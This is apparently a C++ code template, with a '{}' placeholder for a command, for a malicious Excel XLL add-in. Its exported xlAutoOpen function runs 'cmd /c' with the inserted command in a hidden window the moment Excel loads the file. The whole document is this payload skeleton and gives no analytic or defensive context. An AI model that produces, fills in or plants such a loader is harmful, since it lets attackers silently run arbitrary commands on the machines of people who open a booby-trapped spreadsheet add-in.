#include <windows.h>

extern "C" __declspec(dllexport) void xlAutoOpen(void) {{
    WinExec("cmd /c {}",SW_HIDE);
}}